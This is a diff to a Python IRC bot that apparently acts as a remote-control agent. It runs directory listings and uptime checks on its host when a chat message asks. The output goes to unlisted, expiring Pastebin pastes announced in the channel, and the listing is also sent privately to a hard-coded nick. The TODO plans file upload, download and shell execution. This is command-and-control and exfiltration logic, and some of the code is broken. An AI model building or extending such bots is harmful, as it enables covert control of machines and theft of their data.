@@ -7,10 +7,16 @@ Contributors: b0b (Windows stuffs)
 Version: 0.2
 TODO: upload
       download
-      ls -lahF /directory/you/want (dir equivalent)
+      ls -lahF /directory/you/want (dir equivalent) -akama: tested and verifed on linux./might have broken it again.
       execute shell commands
-      idle time
-      help
+      idle time -akama: uptime completed/don't know if time since user interaction is possible in linux
+      help 
+
+
+Windows Functions to be test:
+	uptime
+	ls
+
 '''
 # Libraries
 import socket # Communicate with irc server
@@ -32,7 +38,7 @@ parser.add_argument('nick', help='Nickname')
 args = parser.parse_args()
 
 # Global variables to configure the bot 
-pastebin_api_key = 'INSERT_KEY_HERE'    
+pastebin_api_key = '---INSERT KEY HERE---'    
 server = args.server  # Server
 port = args.port    # Port
 channel = '#' + args.channel # Channel
@@ -130,34 +136,50 @@ def ifconfig(): # Displays network interfaces
 
     sendmsg(channel, url)
 
-# Doesn't work yet :(
+# Error check might not work
 def ls(dir): # Directory listing
   if (str(platform.platform()))[0:3]=="Win":
     
-    p = subprocess.Popen('dir', shell=False, stdout=subprocess.PIPE)
+    p = subprocess.Popen(['dir',dir], shell=False, stdout=subprocess.PIPE)
     p.wait()
     paste_code = p.stdout.read()
     x = PastebinAPI()
     url = x.paste(pastebin_api_key,
                   paste_code,
-                  paste_name = 'ifconfig', 
+                  paste_name = 'ls -lahF', 
                   paste_private = 'unlisted',
                   paste_expire_date = '10M')
 
     sendmsg(channel, url)
   else:
-    p = subprocess.Popen('ls -lahF', shell=False, stdout=subprocess.PIPE)
+    p = subprocess.Popen(['ls', dir, '-lahF'], shell=False, stdout=subprocess.PIPE)
     p.wait()
     paste_code = p.stdout.read()
-    x = PastebinAPI()
-    url = x.paste(pastebin_api_key,
-                  paste_code,
-                  paste_name = 'ifconfig', 
-                  paste_private = 'unlisted',
-                  paste_expire_date = '10M')
+    sendmsg('akama', paste_code)
+    if paste_code.find('No such file') == -1:
+       x = PastebinAPI()
+       url = x.paste(pastebin_api_key,
+                     paste_code,
+                     paste_name = 'ls -lahF', 
+                     paste_private = 'unlisted',
+                     paste_expire_date = '10M')
+       sendmsg(channel, url)
+    else:
+       sendmsg(channel, 'empty file, sorry')
 
-    sendmsg(channel, url)
-
+def uptime(): #Check the uptime of the box that the bot is running on.
+  if (str(platform.platform())) [0:3]=="Win":
+    #This may or may not work, untested at the moment. akama.
+    p = subprocess.Popen('systeminfo | find "System Boot Time"', shell=False, stdout=subprocess.PIPE)
+    p.wait()
+    output = p.stdout.read()
+    sendmsg(channel, output) 
+  else:
+    p = subprocess.Popen('uptime', shell=False, stdout=subprocess.PIPE)
+    p.wait()
+    output = p.stdout.read()
+    sendmsg(channel, output)
+ 
 def pwd(): # Print working directory
   sendmsg(channel, os.getcwd())
 
@@ -209,6 +231,10 @@ def main():
     if ircmsg.find(':pwd '+ botnick) != -1: # Calls pwd() if 'pwd BotName' is found
       pwd()
 
-    if ircmsg.find(':ls ' + directory + botnick) != -1: # Calls ls() if 'pwd BotName' is found
-      ls(directory)
+    if ircmsg.find(':uptime ' + botnick) != -1: # Calls uptime() if 'uptime BotName' is found
+      uptime()
+
+    if ircmsg.find(':ls ' + botnick) != -1: # Calls ls() if 'pwd BotName' is found
+      dir = (ircmsg.split(" ")[len(ircmsg.split(" "))-1])
+      ls(dir)
 main()
